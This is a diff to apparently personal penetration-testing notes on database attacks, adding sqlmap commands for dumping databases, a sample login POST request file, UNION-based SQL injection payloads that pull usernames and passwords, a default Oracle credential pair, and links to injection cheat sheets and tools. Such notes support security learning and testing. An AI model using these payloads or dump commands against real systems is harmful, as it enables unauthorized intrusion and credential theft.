@@ -1,35 +1,96 @@
 # Databases (SQL / NoSQL)
-
-# SQL
-
-
-## SQL injection cheat sheets
+# SQL injection cheat sheets
 - [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
 - [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 
-## SQL injection UNION attack
+# sqlmap
+## GET
+Discover vulnerabilities in databases as well as dump info
+```sh
+sqlmap.py -u <URL> --batch
+```
 
-### Steps
+### POST
+Can use log of a POST request, to search and enumerate a database
+```sh
+sqlmap -r <request_file> --level 5 --risk 3 --batch --string "Wrong identification" --dump
+```
+
+### Request file
+Use burp as that will give you the full request, however it can be done via chrome network tab with a bit of editing.     
+If the latter is chosen please follow
+
+**BASE**
+```
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en,en-US;q=0.9
+Cache-Control: max-age=0
+Connection: keep-alive
+Content-Length: 24
+Content-Type: application/x-www-form-urlencoded
+Host: target.com
+Origin: http://target.com
+Referer: http://target.com/login.php
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+```
+
+**EDITED**
+```
+POST /login.php HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en,en-US;q=0.9
+Cache-Control: max-age=0
+Connection: keep-alive
+Content-Length: 24
+Content-Type: application/x-www-form-urlencoded
+Host: target.com
+Origin: http://target.com
+Referer: http://target.com/login.php
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+
+username=name&password=password
+```
+
+### Arguments explained
+- `-r`
+    - To add the request log file
+
+**OPTIONAL**
+- `--string` 
+    - To filter a given phrase in the response
+- `--dump` 
+    - To dump the db
+
+#### References
+- [https://0xdf.gitlab.io/2018/06/23/htb-falafel.html](https://0xdf.gitlab.io/2018/06/23/htb-falafel.html)
+
+# SQL injection UNION attack
+
+## Steps
 ```
 "test' union select 'table',database(),'C'-- "
 "test' union select 'table',username, password from db.table -- -"
 ```
 
-### Articles to reproduce the attack
+## Articles to reproduce the attack
 - [https://pentest-tools.com/blog/sql-injection-attacks](https://pentest-tools.com/blog/sql-injection-attacks)
 - [https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)
 ​​
 ​
-## MySQL user defined functions
+# MySQL user defined functions
 [​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf](​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)
 
 ​
-## Oracle / ODAT
+# Oracle / ODAT
 Use [this](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf) link as a reference for the steps described below    
 [https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)    
 
-### Basic creds 
+## Basic creds 
 ``` 
 Username --> Scott 
 Password --> tiger
@@ -47,7 +108,7 @@ NoSQL injection knowledge base
 A well curated list of tools and injection methods to use on NoSQL databases by ​[swisskyrepo](https://github.com/swisskyrepo)
 [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
 
-​​
-## NoSQLMap
+​
+# NoSQLMap
 [https://github.com/codingo/NoSQLMap](https://github.com/codingo/NoSQLMap)
 ​​
